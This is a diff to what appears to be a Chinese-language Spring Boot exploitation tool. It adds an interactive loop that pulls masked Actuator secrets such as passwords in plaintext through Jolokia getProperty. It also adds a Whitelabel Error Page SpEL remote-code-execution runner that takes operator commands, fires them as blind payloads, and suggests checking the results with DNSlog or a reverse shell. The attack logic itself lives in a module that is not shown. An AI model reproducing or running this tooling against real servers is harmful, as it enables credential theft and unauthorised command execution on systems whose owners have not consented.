@@ -134,6 +134,27 @@ def run_jolokia(url, proxies, header_new):
     else:
         cprint(f'[.] 未发现jolokia/list路径存在关键词，请手动验证：', "yellow")
     cprint(result["poc"] + '\n', "red")
+    selectd = input("[+] 是否尝试通过Jolokia的getProperty读取Actuator脱敏(******)属性的明文（Y/N）: ")
+    if selectd != "Y":
+        return
+    masked = exploits.find_masked_env_properties(url, proxies, header_new)
+    if masked:
+        cprint("[+] 在env端点发现以下被脱敏(******)的属性：", "red")
+        for key in masked:
+            cprint("    " + key, "red")
+    else:
+        cprint("[.] 未在env端点发现脱敏属性，可手动输入属性名尝试（如security.user.password）", "yellow")
+    while 1:
+        prop = input("[+] 请输入要读取明文的属性名（输入exit退出）>>> ").strip()
+        if prop == "exit":
+            return
+        if not prop:
+            continue
+        value = exploits.exploit_jolokia_get_property(url, prop, proxies, header_new)
+        if value is not None:
+            cprint(f"[+] {prop} = {value}\n", "red")
+        else:
+            cprint("[-] 未能读取该属性明文（MBean不可用或属性不存在）\n", "yellow")
 
 
 def run_cve_2018_1273(url, proxies, header_new):
@@ -262,6 +283,27 @@ def run_cve_2026_47884(url, proxies, header_new):
         cprint("[.] 未能通过视图名读取文件，建议人工尝试SSRF/RCE载荷\n", "yellow")
 
 
+def run_whitelabel_spel(url, proxies, header_new):
+    cprint("======开始对目标URL进行Whitelabel Error Page SpEL RCE漏洞测试======", "green")
+    result = exploits.check_whitelabel_spel(url, proxies, header_new)
+    if not result:
+        cprint("[-] 未发现Whitelabel Error Page SpEL RCE漏洞\n", "yellow")
+        return
+    cprint(f"[+] {url} 存在Whitelabel Error Page SpEL RCE漏洞", "red")
+    cprint(f"[+] 注入点：{result['path'] or '/'} 的 {result['param']} 参数，Poc地址如下：", "red")
+    cprint(result["poc"] + '\n', "red")
+    print("[+] 执行命令模块（无回显，输入exit退出）")
+    while 1:
+        cmd = input("[+] 请输入要执行的命令>>> ")
+        if cmd == "exit":
+            sys.exit(0)
+        status = exploits.exec_whitelabel_spel(url, result["path"], result["param"], cmd, proxies, header_new)
+        if status is not None:
+            cprint(f'[+] 该Payload已经打出（HTTP {status}），由于该漏洞无回显，请用Dnslog或反弹shell验证\n', "red")
+        else:
+            cprint("[-] Payload发送失败\n", "yellow")
+
+
 RUNNERS = {
     1: run_jeespring,
     2: run_cve_2022_22947,
@@ -278,6 +320,7 @@ RUNNERS = {
     13: run_cve_2025_24813,
     14: run_cve_2026_59378,
     15: run_cve_2026_47884,
+    16: run_whitelabel_spel,
 }
 
 
